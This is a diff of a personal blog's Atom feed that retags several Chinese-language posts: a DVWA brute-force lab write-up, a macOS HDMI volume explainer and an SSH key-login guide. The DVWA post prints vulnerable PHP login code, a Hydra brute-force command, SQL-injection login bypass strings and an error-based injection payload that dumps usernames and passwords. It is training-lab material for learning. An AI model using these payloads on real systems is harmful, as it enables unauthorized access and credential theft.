@@ -6,7 +6,7 @@
   <link href="https://doodlexu.github.io/atom.xml" rel="self"/>
   
   <link href="https://doodlexu.github.io/"/>
-  <updated>2021-05-15T03:42:34.369Z</updated>
+  <updated>2021-05-15T03:45:15.863Z</updated>
   <id>https://doodlexu.github.io/</id>
   
   <author>
@@ -21,7 +21,7 @@
     <link href="https://doodlexu.github.io/posts/undefined/"/>
     <id>https://doodlexu.github.io/posts/undefined/</id>
     <published>2021-05-14T23:50:48.000Z</published>
-    <updated>2021-05-15T03:42:34.369Z</updated>
+    <updated>2021-05-15T03:45:15.863Z</updated>
     
     <content type="html"><![CDATA[<h1 id="Brute-Force-暴力破解"><a href="#Brute-Force-暴力破解" class="headerlink" title="Brute Force 暴力破解"></a>Brute Force 暴力破解</h1><blockquote><p>爆破永远是最经典的，也是最有暴力美学的渗透方式。</p></blockquote><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment"># 获取用户名和密码</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 查询验证用户名和密码</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysql_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">      <span class="comment"># 输出头像和用户名</span></span><br><span class="line">      <span class="variable">$avatar</span> = mysql_result( <span class="variable">$result</span>, <span class="number">0</span>, <span class="string">&quot;avatar&quot;</span> );</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        登录失败</span><br><span class="line">    &#125;</span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一题中的问题有很多，解法也不止一种。因为安全等级是Low，也就不考虑太多，这里记录一下两种解法：</p><ol><li>爆破（出题人推荐解法）</li><li>SQL注入</li></ol><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><p>这里我用的是<code>Hydra</code>来爆破，Hydra[ˈhaɪdrə]，原意九头蛇，是希腊神话中的怪兽。</p><p>参考命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P pass.txt -f 127.0.0.1 http-get-form <span class="string">&quot;/vulnerabilities/brute/:username=^USER^&amp;password=^PASS^&amp;Login=Login#:Username and/or password incorrect.:H=Cookie: 35l9io0j22ej6j6umvc3g561u6; security=low&quot;</span></span><br></pre></td></tr></table></figure><h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h3><p>该难度下的爆破题并没有对用户输入项进行过滤，那么考虑最简单的<code>SQL注入</code>，万能密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><p>或者从URL注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;admin&#39;--+&amp;password&#x3D;111&amp;Login&#x3D;Login#</span><br></pre></td></tr></table></figure><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>该解法是在尝试SQL注入时，错误的输入了万能密码，导致报错<code>mysql_error() </code>，于是就有了此解法。</p><p><em>Payload来自国光大佬：</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;admin&#39;+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(user,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+&amp;password&#x3D;111&amp;Login&#x3D;Login#</span><br></pre></td></tr></table></figure>]]></content>
     
@@ -37,7 +37,11 @@
     <category term="知识" scheme="https://doodlexu.github.io/categories/%E7%9F%A5%E8%AF%86/"/>
     
     
-    <category term="信息安全, 入门, 靶场" scheme="https://doodlexu.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8-%E5%85%A5%E9%97%A8-%E9%9D%B6%E5%9C%BA/"/>
+    <category term="信息安全" scheme="https://doodlexu.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
+    
+    <category term="入门" scheme="https://doodlexu.github.io/tags/%E5%85%A5%E9%97%A8/"/>
+    
+    <category term="靶场" scheme="https://doodlexu.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
     
   </entry>
   
@@ -46,7 +50,7 @@
     <link href="https://doodlexu.github.io/posts/59324/"/>
     <id>https://doodlexu.github.io/posts/59324/</id>
     <published>2021-03-11T14:10:46.000Z</published>
-    <updated>2021-05-14T23:45:19.076Z</updated>
+    <updated>2021-05-15T03:45:44.809Z</updated>
     
     <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>一次偶然的机会，在用macOS外接显示器的时候，用HDMI接口连接带音响的屏幕时，无法调节音量。显示<code>所选设备没有输出控制</code>。随即去找原因，本以为是Bug这么简单，没想到这居然还是个<code>feature</code>。</p><h1 id="背后的故事"><a href="#背后的故事" class="headerlink" title="背后的故事"></a>背后的故事</h1><p>首先<code>HDMI</code>全称叫高清多媒体接口（High Definition Multimedia Interface，HDMI）是一种全数字化视频和声音发送接口，可以发送未压缩的音频及视频信号。之所以他能出现上文所描述的现象，是因为 macOS 检测到你HDMI接口所连接的设备支持音频输出时，他会以<code>数字音频的方式输出</code>而不走 DAC（数模转换器），系统的音量控制好像只能是经过 DAC 出来的模拟信号来控制，而数字音频输出要保证信号的完整性，从而绕过了 DAC 所以不能调节音量。</p><p>其次，调节音量这个功能应该由功放来做，因为一旦调整了音量就说明系统已经改变了数字流，而不是“无损”音源了。并且许多情况使用HDMI作为输出的时候，可能不仅仅是往外放上接。这种情况如果要做进一步处理，就要尽量保证处理流程中的每一步都不能损失信息，这也是数字信号诞生的目的。用一种不太严谨的说法，数字信号本身人就不能被直接听到，后面要接 DAC 这样就会造成信号的失真。综上所述，造成信息损失的步骤应该放在最后一步，这也是macOS在HDMI输出音频信号时，无法调节音量的根本原因。</p><h1 id="特例"><a href="#特例" class="headerlink" title="特例"></a>特例</h1><p>在上述条件的基础上，我也找到了<code>特例</code>，那就是我们的视窗系统——Windows。它无视输出接口类型与协议。系统默认在输出前就过了一遍 DAC， 所以可以支持系统条件HDMI的音量。</p><h1 id="我的一些看法"><a href="#我的一些看法" class="headerlink" title="我的一些看法"></a>我的一些看法</h1><p>这件事情的一开始我也以为是macOS的Bug，在网上找方法，随即看到了<a href="https://www.v2ex.com/t/242238?p=2">V2EX</a>上的讨论, 才涨了见识。于是整理出这篇文章。不过很可惜的是，这篇帖子已经沦为了撕逼贴。正如上面的特例所描述那样，其实这两款系统的处理方式都没有错，并不至于撕出个谁对谁错。</p><p>出于用户的方便考虑，支持直接调节音量也挺好，毕竟需要无损音源的专业人员，和所有其他用户的数量比起来，音质好像也没那么重要了。</p><p>出于理性考虑，macOS的做法也是正确的。将有损步骤放到最后一步，以得到最佳音源。</p>]]></content>
     
@@ -61,7 +65,13 @@
     <category term="知识" scheme="https://doodlexu.github.io/categories/%E7%9F%A5%E8%AF%86/"/>
     
     
-    <category term="HDMI, macOS， 音量， 数字音频" scheme="https://doodlexu.github.io/tags/HDMI-macOS%EF%BC%8C-%E9%9F%B3%E9%87%8F%EF%BC%8C-%E6%95%B0%E5%AD%97%E9%9F%B3%E9%A2%91/"/>
+    <category term="HDMI" scheme="https://doodlexu.github.io/tags/HDMI/"/>
+    
+    <category term="macOS" scheme="https://doodlexu.github.io/tags/macOS/"/>
+    
+    <category term="音量" scheme="https://doodlexu.github.io/tags/%E9%9F%B3%E9%87%8F/"/>
+    
+    <category term="数字音频" scheme="https://doodlexu.github.io/tags/%E6%95%B0%E5%AD%97%E9%9F%B3%E9%A2%91/"/>
     
   </entry>
   
@@ -70,7 +80,7 @@
     <link href="https://doodlexu.github.io/posts/59324/"/>
     <id>https://doodlexu.github.io/posts/59324/</id>
     <published>2021-03-11T14:10:46.000Z</published>
-    <updated>2021-05-14T23:37:46.946Z</updated>
+    <updated>2021-05-15T03:46:26.589Z</updated>
     
     <content type="html"><![CDATA[<h1 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h1><p>🐦 鸽了。。。</p><p>找个时间补上。。。</p>]]></content>
     
@@ -87,7 +97,9 @@
     <category term="知识" scheme="https://doodlexu.github.io/categories/%E7%9F%A5%E8%AF%86/"/>
     
     
-    <category term="js, web框架" scheme="https://doodlexu.github.io/tags/js-web%E6%A1%86%E6%9E%B6/"/>
+    <category term="js" scheme="https://doodlexu.github.io/tags/js/"/>
+    
+    <category term="web框架" scheme="https://doodlexu.github.io/tags/web%E6%A1%86%E6%9E%B6/"/>
     
   </entry>
   
@@ -96,7 +108,7 @@
     <link href="https://doodlexu.github.io/posts/41005/"/>
     <id>https://doodlexu.github.io/posts/41005/</id>
     <published>2021-03-08T06:10:01.000Z</published>
-    <updated>2021-03-08T07:13:14.000Z</updated>
+    <updated>2021-05-15T03:46:12.367Z</updated>
     
     <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>在 Mac 上配置 SSH 密钥登录远程的 Linux</p></blockquote><h1 id="相关配置"><a href="#相关配置" class="headerlink" title="相关配置"></a>相关配置</h1><h2 id="创建本地的-SSH-密钥"><a href="#创建本地的-SSH-密钥" class="headerlink" title="创建本地的 SSH 密钥"></a>创建本地的 SSH 密钥</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&#x27;example@example.com&#x27;</span></span><br><span class="line">-t 指定密钥类型，默认即 rsa</span><br><span class="line">-C 设置注释文字，比如你的邮箱</span><br></pre></td></tr></table></figure><p>在配置过程中，可以根据提示设置<code>私钥</code>密码，我这里就不设置，默认为空，回车即可。</p><p>生成的密钥默认在<code>家目录</code>下的<code>.ssh</code>目录下</p><h2 id="上传公钥到远程-Linux-服务器"><a href="#上传公钥到远程-Linux-服务器" class="headerlink" title="上传公钥到远程 Linux 服务器"></a>上传公钥到远程 Linux 服务器</h2><p>使用 scp 复制公钥到远程服务器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P &lt;端口号&gt; ~/.ssh/id_rsa.pub &lt;用户名&gt;@&lt;ip地址&gt;:/home/id_rsa.pub</span><br></pre></td></tr></table></figure><h2 id="配置远程-Linux-的私钥"><a href="#配置远程-Linux-的私钥" class="headerlink" title="配置远程 Linux 的私钥"></a>配置远程 Linux 的私钥</h2><p>登录远程 Linux 服务器，把公钥追加到服务器 ssh 认证文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>如果在 家目录 没有 .ssh 目录或 authorized_keys 文件，可以创建一下，并授予 authorized_keys 文件 600 权限</p><p>然后在执行 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><h2 id="创建配置文件快速登录"><a href="#创建配置文件快速登录" class="headerlink" title="创建配置文件快速登录"></a>创建配置文件快速登录</h2><p>每次登录都需要输入用户名和地址，这样也是太麻烦，可以添加配置文件，使用<code>别名</code>来登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">% vi ~/.ssh/config</span><br><span class="line">Host            <span class="built_in">alias</span>            <span class="comment">#自定义别名</span></span><br><span class="line">HostName        0.0.0.0          <span class="comment">#替换为你的ssh服务器ip或domain</span></span><br><span class="line">Port            22               <span class="comment">#ssh服务器端口，默认为22</span></span><br><span class="line">User            root             <span class="comment">#ssh服务器用户名</span></span><br><span class="line">IdentityFile    ~/.ssh/id_rsa    <span class="comment">#第一个步骤生成的公钥文件对应的私钥文件</span></span><br></pre></td></tr></table></figure><p>此时就可以使用 ssh进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh <span class="built_in">alias</span></span><br></pre></td></tr></table></figure><h2 id="禁止-Linux-使用账号密码登录"><a href="#禁止-Linux-使用账号密码登录" class="headerlink" title="禁止 Linux 使用账号密码登录"></a>禁止 Linux 使用账号密码登录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">% <span class="built_in">cd</span> /etc/ssh/ &amp; vi sshd_config</span><br><span class="line"></span><br><span class="line"><span class="comment"># sshd_config:</span></span><br><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">AuthorizedKeysFile      .ssh/authorized_keys</span><br><span class="line"><span class="comment">#AuthorizedKeysCommand none</span></span><br><span class="line"><span class="comment">#AuthorizedKeysCommandRunAs nobody</span></span><br><span class="line"><span class="comment">#默认PasswordAuthentication 为yes,即允许密码登录，改为no后，禁止密码登录</span></span><br><span class="line">PasswordAuthentication no</span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line">% systemctl restart sshd.service</span><br></pre></td></tr></table></figure>]]></content>
     
@@ -114,7 +126,11 @@
     <category term="技术" scheme="https://doodlexu.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
     
     
-    <category term="Mac, Linux, SSH" scheme="https://doodlexu.github.io/tags/Mac-Linux-SSH/"/>
+    <category term="Mac" scheme="https://doodlexu.github.io/tags/Mac/"/>
+    
+    <category term="Linux" scheme="https://doodlexu.github.io/tags/Linux/"/>
+    
+    <category term="SSH" scheme="https://doodlexu.github.io/tags/SSH/"/>
     
   </entry>
   
